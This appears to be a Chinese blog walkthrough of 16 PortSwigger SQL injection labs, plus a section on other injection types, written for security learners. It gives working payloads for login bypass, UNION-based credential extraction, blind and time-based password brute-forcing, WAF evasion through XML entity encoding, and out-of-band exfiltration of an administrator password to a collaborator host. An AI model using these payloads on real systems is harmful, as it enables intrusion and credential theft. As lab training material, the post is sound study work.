# 原创
：  【burpsuite安全练兵场-服务端1】SQL注入-17个实验（全）

# 【burpsuite安全练兵场-服务端1】SQL注入-17个实验（全）

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点： 
（1）检索隐藏数据（√）
（2）颠覆应用程序逻辑（√）
（3）从其他数据库表中检索数据（√）
（4）SQL盲注（√）
（5）其他类型SQL注入（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|服务端专项|所需基础知识|学习目标|状态
|[【0X01】SQL注入-17个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128434815?spm=1001.2014.3001.5501)|1、数据库基本语法| 1、掌握SQL注入方法 2、掌握不同注入的区别 3、掌握注入的意义，即可以发现的信息 |已发布
|[【0X02】身份认证漏洞-16个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128454196?spm=1001.2014.3001.5501)| 1、基本信收集 2、爆破工具的使用（如BP） 3、需要一点的逻辑分析能力 | 1、掌握身份验证的方法 2、掌握对数据包差别的细微分析 3、掌握身份认证的基本逻辑 |已发布
|[【0X03】目录遍历漏洞-6个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128487462?spm=1001.2014.3001.5501)|1、对于路径的敏感度| 1、掌握路径模糊查询（爆破） 2、掌握基本的绕过方法 |已发布
|[【0X04】操作系统命令注入-5个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128495612?spm=1001.2014.3001.5501)| 1、基本操作系统命令（可慢慢接触后学） 2、带外的平台（可慢慢发现） 3、带外的服务器（实验可使用BP提供的） | 1、掌握基本命令 2、掌握BP提供的服务器 3、掌握拼拼接命令 |已发布
|[【0X05】业务逻辑漏洞-11个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128509488?spm=1001.2014.3001.5501)| 1、需要会基本的BP使用能力（后期可不断提高）  2、基础的数据包分析能力（可不断提升） | 1、掌握如何分析业务逻辑 2、掌握业务逻辑的可能缺陷 3、掌握业务逻辑的第三方功能 |已发布
|[【0X06】信息泄露漏洞-5个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128544645?spm=1001.2014.3001.5501)| 1、需要会一些发现的工具（后期可不断使用新工具） 2、需要会一点Linux基本工具命令 | 1、掌握BP信息收集的工具的使用方法 2、掌握常见的信息泄露及其获取方法 |已发布
|【0X07】访问控制|即将发布，敬请期待|——|——
|【0X08】文件上传|即将发布，敬请期待|——|——
|【0X09】服务端请求伪造SSRF|即将发布，敬请期待|——|——
|【0X10】XEE注射|即将发布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、SQL意义](#%E4%B8%80%E3%80%81SQL%E6%84%8F%E4%B9%89)

[1、目的：](#1%E3%80%81%E7%9B%AE%E7%9A%84%EF%BC%9A)

[2、示例：](#2%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[二、检索隐藏数据](#%E4%BA%8C%E3%80%81%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE)

[实验1：隐藏商品](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E9%9A%90%E8%97%8F%E5%95%86%E5%93%81)

[三、颠覆应用程序逻辑](#%E4%B8%89%E3%80%81%E9%A2%A0%E8%A6%86%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91)

[实验2：登陆逻辑](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E7%99%BB%E9%99%86%E9%80%BB%E8%BE%91)

[四、从其他数据库表中检索数据](#%E5%9B%9B%E3%80%81%E4%BB%8E%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%AD%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)

[实验3：判断列](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%88%A4%E6%96%AD%E5%88%97)

[实验4：判断字段对应位置](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E5%AF%B9%E5%BA%94%E4%BD%8D%E7%BD%AE)

[实验5：其他表检索数据](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%85%B6%E4%BB%96%E8%A1%A8%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)

[实验6：单个列中检索多个字段](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%A4%9A%E4%B8%AA%E5%AD%97%E6%AE%B5)

[实验7：Orange数据库版本](#%E5%AE%9E%E9%AA%8C7%EF%BC%9AOrange%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC)

[实验8：Mysql数据库版本](#%E5%AE%9E%E9%AA%8C8%EF%BC%9AMysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC)

[实验9：Orange数据库检索1](#%E5%AE%9E%E9%AA%8C9%EF%BC%9AOrange%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A3%80%E7%B4%A21)

[实验10：Orange数据库检索2](#%E5%AE%9E%E9%AA%8C10%EF%BC%9AOrange%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A3%80%E7%B4%A22)

[五、SQL盲注](#%E4%BA%94%E3%80%81SQL%E7%9B%B2%E6%B3%A8)

[实验11：带条件响应的SQL注入](#%E5%AE%9E%E9%AA%8C11%EF%BC%9A%E5%B8%A6%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9A%84SQL%E6%B3%A8%E5%85%A5)

[实验12：条件判断SQL注入](#%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%ADSQL%E6%B3%A8%E5%85%A5)

[实验13：时延盲注](#%E5%AE%9E%E9%AA%8C13%EF%BC%9A%E6%97%B6%E5%BB%B6%E7%9B%B2%E6%B3%A8)

[实验14：时延SQL注入](#%E5%AE%9E%E9%AA%8C14%EF%BC%9A%E6%97%B6%E5%BB%B6SQL%E6%B3%A8%E5%85%A5)

[实验15：带外技术](#%E5%AE%9E%E9%AA%8C15%EF%BC%9A%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF)

[实验16：带外SQL注入](#%E5%AE%9E%E9%AA%8C16%EF%BC%9A%E5%B8%A6%E5%A4%96SQL%E6%B3%A8%E5%85%A5)

[六、其他类型SQL注入](#%E5%85%AD%E3%80%81%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8BSQL%E6%B3%A8%E5%85%A5)

---


> 
<h2> <img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>助你一臂之力  </h2>
<h3>📋问题1：大佬们都是如何快速发现漏洞点的？</h3>
🎯编写自动化脚本跑
🎯经验之谈（熟能生巧）
🎯细心谨慎（注意到一些细微差别）
<hr/>
<h2>📋问题2：使用的工具有哪些？</h2>
🎯BP的攻击模块
🎯sqlmap
🎯更多的是自己编写的脚本


## 📋问题2：使用的工具有哪些？

## 一、SQL意义

> 
<h3>1、目的：</h3>
未经授权访问敏感数据
<hr/>
<h3>2、示例：</h3>
1、检索隐藏数据，在其中修改 SQL 查询以返回其他结果。<br/> 2、颠覆应用程序逻辑，在其中更改查询以干扰应用程序的逻辑。<br/> 3、UNION 攻击，在其中从不同的数据库表中检索数据。<br/> 4、检查数据库，在其中提取有关数据库版本和结构的信息。<br/> 5、盲 SQL 注入，控制的查询结果不会在应用程序的响应中返回。


### 2、示例：

---


---


## 二、检索隐藏数据

> 
心得：隐藏参数的注释（或者爆破分类，从而得到隐藏分类）

<pre><code>示例：
一个显示不同类别产品的购物应用程序。当用户单击“礼品”类别时，其浏览器会请求 URL：
https://insecure-website.com/products?category=Gifts

SQL查询，以从数据库中检索相关产品的详细信息：
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

此 SQL 查询要求数据库返回：
所有详细信息 （*）
从产品表
其中类别为礼品
并释放是 1

该限制用于隐藏未发布的产品。对于未发布的产品，大概为released = 1 released = 0</code></pre>

<pre><code>注入：
构建如下攻击（'--）
https://insecure-website.com/products?category=Gifts'--

将导致 SQL 查询：
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
后面查询的其余部分将被删除（--AND released = 1），意味着将显示所有产品，包括未发布的产品


攻击者可以使应用程序显示任何类别中的所有产品，包括他们不知道的类别：
https://insecure-website.com/products?category=Gifts'+OR+1=1--

将导致 SQL 查询：
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
将返回类别为“礼物”或 1 = 1 的所有（始终为 true）</code></pre>
<hr/>
<h3>实验1：隐藏商品</h3>
part1：
点击分类为礼物（未做任何修改）

<hr/>
part2：
把分类后面的内容注释调了，出现了新产品

<hr/>
part3：
随便点击一个分类（加上'+or+1=1--）

 显示了所有商品（包括隐藏商品）<img alt="" height="972" src="https://img-blog.csdnimg.cn/d16e57eba4f64cd7a1282939ae24113b.png" width="1200"/>


---


---


---


## 三、颠覆应用程序逻辑

> 
心得：登陆逻辑的绕过（相当于试判断成立）

<pre><code>示例：
如果用户提交用户名和密码
执行SQL 查询来检查凭据：（wiener  bluecheese）
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
如果查询返回用户的详细信息，则登录成功。否则，将被拒绝</code></pre>
<hr/>
<pre><code>注入：
使用 SQL 注释序列从查询子句中删除密码检查，即可在没有密码的情况下以任何用户身份登录
如提交用户名+空白密码（--WHEREadministrator'--）
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
此查询返回用户名为administrator的用户，并成功将攻击者登录到该用户。</code></pre>
<hr/>
<h3>实验2：登陆逻辑</h3>
part1：
点击后进行登陆（需要输入密码，才能提交）

<hr/>
part2：
POST数据包中有csrf、username、password三个参数
 <img alt="" height="509" src="https://img-blog.csdnimg.cn/c0fbf6a7c73e44d19649af948e1c0dd3.png" width="662"/>
 在username后加上'--注释掉后面的内容
（前提不是预编译那种，且没过滤，害）




---


---


---


## 四、从其他数据库表中检索数据

> 
心得：union联合查询（类似的还有堆叠注入，order by分类）
<pre><code>示例：
如果 SQL 查询的结果在应用程序的响应中返回，攻击者可以利用 SQL 注入漏洞从数据库中的其他表中检索数据。这是使用关键字完成的，该关键字允许您执行其他查询并将结果追加到原始查询。UNIONSELECT
例如，如果应用程序执行以下包含用户输入“礼物”的查询：
SELECT name, description FROM products WHERE category = 'Gifts'</code></pre>

<pre><code>注入：
攻击者可以提交输入：
' UNION SELECT username, password FROM users--</code></pre>
<hr/>
<h3>实验3：判断列</h3>
part1：<br/>  
<pre><code>点击一个分类
然后判断列数
'order by 3 --
正常回显</code></pre>

<pre><code>'order by 4 --

报错</code></pre>

<hr/>
part2：
本题是要使用union select
<pre>`'union+select+null,null,null--`</pre>




---


> 
心得：判断字段数，以及可回现的位置、字段名
<h3>实验4：判断字段对应位置</h3>
part1：
<pre>`'union+select+'NeXKXZ',null,null--`</pre>
使用题目给的字符串，3个位置依次换，直到对上指定列的位置


<pre>`'union+select+null,'NeXKXZ',null--`</pre>
在第二个位置就正确了




> 
心得：union select联合查询数据
<h3>实验5：其他表检索数据</h3>
part1：
先判段为2列，再根据题目信息，username,password
<pre>`'union+select+username,password from users--`</pre>


<hr/>
part2：
使用账号登陆
<table><tbody>|administrator|of0vwdslqljccpzv3eik
</tbody></table>




> 
心得：单个列中联合检索多个列的数据（不同数据库连接方法不同）
<h3>实验6：单个列中检索多个字段</h3>
判断是2列后
发现不是2列都是字符型
<pre>`'union+select+'a','a'--`</pre>

第二列才是返回的字符型
第一列是数值型
<pre>`'union+select+null,'a'--`</pre>

<pre>`'union+select+'a',null--`</pre>

<pre><code>扩展（不同数据库字符串的连接方法）：
Oracle: 'foo'||'bar'
SQL Server: 'foo'+'bar'
Mysql: 'foo' 'bar'（空格） CONCAT('foo','bar')
PostgreSQL: 'foo'||'bar'</code></pre>
<hr/>
part2:
将username,password合并到了一列带出
<pre>`'union+select+null,username||'~'||password+from+users----`</pre>

<hr/>
part3:
登陆


---


> 
心得：不同的数据库查询语句不同
<h3>实验7：Orange数据库版本</h3>
part1：
提示了为Oracle数据库（查询需要带上表，dual表，此表是Oracle数据库中的一个自带表）
order+by判断为2列，且2列都字符串型
<pre>`'union+select+'a','b'+from+dual--`</pre>
<img alt="" height="1021" src="https://img-blog.csdnimg.cn/f1193d49d82d40d89324485c672a9b31.png" width="1200"/><br/>  
<pre><code>扩展（各数据库查询版本语句）：
Mysql        SELECT version()
Sql Server   SELECT @@version
Oracle       SELECT * FROM v$version
Postgre      SELECT version()</code></pre>
<hr/>
part2:
banner提示：


<pre>`'union+select+banner,null+from+v$version--`</pre>



> 
心得：通过不同数据库查询语句，判断为何种数据库
<h3>实验8：Mysql数据库版本</h3>
part1:
<pre><code>'order by 2-- a
'union+select+null,'a'-- a</code></pre>
(此处-- a是为了使空格不被插件忽略，使得注释成功)
————
part2:
<pre>`'union+select+null,version()-- a`</pre>

 <img alt="" height="1021" src="https://img-blog.csdnimg.cn/a2910a33787449f2838c01b29546a9d4.png" width="1200"/>


> 
心得：基础知识：自带的information_schema
<h3>实验9：Orange数据库检索1</h3>
part1：
2列，且都是字符型
<pre><code>'order by 2--
'+UNION+SELECT+'a','b'--</code></pre>
<hr/>
part2:
查所有表（自带的information_schema）
<pre>`'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`</pre>

查用户相关的表中的所有字段
<pre>`'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_ybbtel'--`</pre>


查字段所对应的数据
<pre>`'+UNION+SELECT+username_icxunp,password_gqvjoo+FROM+users_ybbtel--`</pre>

<hr/>
part3：
登陆


---


> 
心得：Orange特殊之FROM+dual
<h3>实验10：Orange数据库检索2</h3>
part1：
2列，且都是字符型
<pre><code>'order by 2--
'UNION+SELECT+'a','b'+FROM+dual--</code></pre>
<hr/>
part2：
查所有表（找到用户表）
<pre>`'UNION+SELECT+table_name,NULL+FROM+all_tables--`</pre>

查所有字段
<pre>`'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_YSRTOP'--`</pre>

 爆数据

<pre>`'UNION+SELECT+USERNAME_KNSBZS,PASSWORD_VROHTE+FROM+USERS_YSRTOP--`</pre>

<hr/>
part3：
登陆



---


---


---


## 五、SQL盲注

> 
[【SQL盲注】基础函数、报错回显、延时判断、逻辑判断盲注<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/123124994?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167195559916800188519290%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167195559916800188519290&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-123124994-null-null.blog_rank_default&amp;utm_term=sql%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/123124994?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167195559916800188519290%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167195559916800188519290&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-123124994-null-null.blog_rank_default&amp;utm_term=sql%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)
[【SQL注入-无回显】布尔盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167195559916800188519290%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167195559916800188519290&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-125275974-null-null.blog_rank_default&amp;utm_term=sql%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167195559916800188519290%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167195559916800188519290&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-125275974-null-null.blog_rank_default&amp;utm_term=sql%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)
[【SQL注入-无回显】时间盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167195559916800188519290%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167195559916800188519290&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-6-125096394-null-null.blog_rank_default&amp;utm_term=sql%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167195559916800188519290%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167195559916800188519290&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-6-125096394-null-null.blog_rank_default&amp;utm_term=sql%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)





> 
心得：观察回显的不同（先看字节数）
<h3>实验11：带条件响应的SQL注入</h3>
part1：
加上
<pre>`' AND 1=1--`</pre>


<pre>`' AND 1=2--`</pre>
 少了一个欢迎回来，而且字节数也少了
说明存在注入点<img alt="" height="992" src="https://img-blog.csdnimg.cn/f126950bf4dc4c78ad55a010689b9695.png" width="1200"/>
<hr/>
part2:
判单是否存在users表
<pre><code>' AND (SELECT 'a' FROM users LIMIT 1)='a'--

（存在）</code></pre>

判断是否存在administrator用户
<pre><code>' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--

(存在)</code></pre>

判断密码长度
<pre><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a'--

(直接跑一下)</code></pre>


到数字20的时候就不成立了
说明密码有20位

爆破每一个字符的值
<pre>`' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--`</pre>


payload1:

payload2:

结果：
按照payload1的顺序讲payload2排列起来就可以了（先将所有数据包按降序排列）
 <img alt="" height="784" src="https://img-blog.csdnimg.cn/11d0487798d245fe9ae64ae984032d63.png" width="842"/>
 98l1jlxbm80mk8dfnpmk
<hr/>
part3：
登陆


---


> 
心得：通过条件判断执行对应语句
<h3>实验12：条件判断SQL注入</h3>
part1:
单引号报错

 2个单引号就正常了
（存在注入点，且为单引号闭合）

 判断数据库类型
<pre><code>' || (select '') || '

（报错，不是MySQL）</code></pre>

<pre><code>'||(SELECT '' FROM dual)||'

（未报错，可能是Oracle数据库）</code></pre>

 （再次证明其他无关性，换一个不存在的表报错）

<hr/>
part2：
<pre><code>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

（rownum=1 防止查询的时候返回多行）</code></pre>

再用类似上一个实验一样的方法，猜表、用户名，爆破密码
<pre><code>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

（when的条件成立时，会执行then后的内容，即执行成功1/0报错，若不成立，则返回else后的内容）</code></pre>

 判断是否存在administrator用户
<pre><code>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
（用户不存在、1=1不成立有一个为fause时候返回200状态码，否则为ture，执行执行成功1/0报错）</code></pre>

 判断密码位数
<pre>`'||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`</pre>

<img alt="" height="580" src="https://img-blog.csdnimg.cn/cb422028fe564d6085fc72207d88e97c.png" width="658"/> 到20的时候就返回200状态码了，说明密码长度为20位<img alt="" height="784" src="https://img-blog.csdnimg.cn/c60ade40bdb145a4a4ce1bc028954902.png" width="842"/>
 爆破密码
<pre>`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`</pre>
 <img alt="" height="672" src="https://img-blog.csdnimg.cn/34d5aef0e2b94a169ffc821a668ed79f.png" width="1200"/>
 payload1：

 payload2：


结果：
按照payload1的顺序讲payload2排列起来就可以了（先将所有数据包按降序排列）

e8q11s15y9pc8z5b2n78
<hr/>
part3:
登陆 


---


> 
心得：拼接时间延迟函数
<h3>实验13：时延盲注</h3>
<pre>`'||sleep(10)--`</pre>
（几乎没什么时延，不是MySQL数据库）

<hr/>
<pre>`'||pg_sleep(10)--`</pre>
（时延10s）




> 
心得：通过条件判断语句运行不同的命令
<h3>实验14：时延SQL注入</h3>
part1：
验证时延语句
<pre><code>'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

（延迟10s）</code></pre>

<pre><code>'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

（几乎无延迟）</code></pre>

 判断用户administrator是否存在
<pre><code>'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

（延迟10s，说明为ture，即存在）</code></pre>

 判断密码长度
<pre>`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`</pre>
结果肯定是20位
爆破密码
<pre>`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`</pre>

 <img alt="" height="462" src="https://img-blog.csdnimg.cn/9eac6a310eaa44568ab39b056d61611c.png" width="518"/>
 <img alt="" height="384" src="https://img-blog.csdnimg.cn/30f5416e08274e83b0bb821d9514a6a0.png" width="475"/>
<hr/>
结果：
勾选上时间



 （我偷偷把延迟时间改为了2s，没想到居然误差有点小大，从大抓准没错）
nnn11iyvkal1dvdwosmr（错了，还是不能缩太短，害）
<hr/>
重新设6s

ndkt1iyvkal1svdw0omr(ok了)
<hr/>
part3：
登陆


---


> 
心得：拼接后将数据带外回显
<h3>实验15：带外技术</h3>
part1:

复制后，修改http://后面

<pre>`'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//iykblv2ne2x9e8fpic4ap9qwinodc2.burpcollaborator.net"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--`</pre>

<hr/>
part2：

 <img alt="" height="842" src="https://img-blog.csdnimg.cn/34468bfcbe2d43b4bd5192098883d6ad.png" width="906"/>


> 
心得：拼接将数据带外回显
<h3>实验16：带外SQL注入</h3>
**part1：**

（将划线部分替换为自己的，注入语句夹在了http头和URL之间）
<pre>`'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.1km5gjbs8t098rhznbrdxtuo5fb5zu.burpcollaborator.net"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--`</pre>
<hr/>
**part2:**
<img alt="" height="992" src="https://img-blog.csdnimg.cn/6f8f8fa7ff844b2d9b366ffbd8b8b005.png" width="1200"/> <img alt="" height="842" src="https://img-blog.csdnimg.cn/3f9055d4dce74defbdb8cd0bb15bdaa6.png" width="906"/>
 前面这个就是带出的密码<img alt="" height="842" src="https://img-blog.csdnimg.cn/73d777c3da73448b8b5d44845fd88c80.png" width="906"/>
<hr/>
**part3:**
登陆


---


---


---


## 六、其他类型SQL注入

> 
 心得：各种类型与数据库有关的数据交互
<pre><code>示例：
可以使用应用程序作为 SQL 查询处理的任何可控输入来执行 SQL 注入攻击
如一些网站采用 JSON 或 XML 格式的输入，并使用它来查询数据库。
这些不同的格式甚至可能为您提供其他方法来混淆由于 WAF 和其他防御机制而被阻止的攻击。弱实现通常只是在请求中查找常见的 SQL 注入关键字，因此您可以通过简单地编码或转义禁止关键字中的字符来绕过这些过滤器。


如以下基于 XML 的 SQL 注入使用 XML 转义序列对 中的S字符进行编码
&lt;stockCheck&gt;
    &lt;productId&gt;
        123
    &lt;/productId&gt;
    &lt;storeId&gt;
        999 &amp;#x53;ELECT * FROM information_schema.tables
    &lt;/storeId&gt;
&lt;/stockCheck&gt;
将在传递给 SQL 解释器之前在服务器端解码</code></pre>

<hr/>


<pre><code>漏洞识别：
1、请注意，库存检查功能以 XML 格式将 productId和 storeId发送到应用程序。
2、将POST /product/stock请求发送到bp中继器。
3、在 Burp 中继器中，探测storeId 以查看是否评估了您的输入。例如，尝试将 ID 替换为计算结果为其他潜在 ID 的数学表达式，例如：
&lt;storeId&gt;1+1&lt;/storeId&gt;
4、观察您的输入似乎由应用程序评估，返回不同商店的库存。
5、尝试通过将语句追加到原始存储 ID 来确定原始查询返回的列数：UNION SELECT
&lt;storeId&gt;1 UNION SELECT NULL&lt;/storeId&gt;
6、请注意，请求由于被标记为潜在攻击而被阻止。




绕过 WAF：
1、在注入 XML 时，请尝试使用 XML 实体对有效负载进行模糊处理。一种方法是使用 Hackvertor 扩展。只需突出显示您的输入，右键单击，然后选择 Hackvertor &gt;扩展&gt;编码 &gt; dec_entities/hex_entities。
2、重新发送请求，并注意您现在收到来自应用程序的正常响应。这表明您已成功绕过 WAF。




漏洞利用：
1、从上次中断的地方继续，并推断查询返回单个列。当您尝试返回多列时，应用程序将返回0 units ，这意味着错误。
2、由于只能返回一列，因此需要连接返回的用户名和密码，例如：
&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;@/hex_entities&gt;&lt;/storeId&gt;
3、发送此查询并观察是否已成功从数据库中获取用户名和密码（用字符分隔）。~
4、使用管理员的凭据登录并解决实验室问题</code></pre>



---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.1/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=MBR7"/>https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cn<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.1/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=MBR7"/>https://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
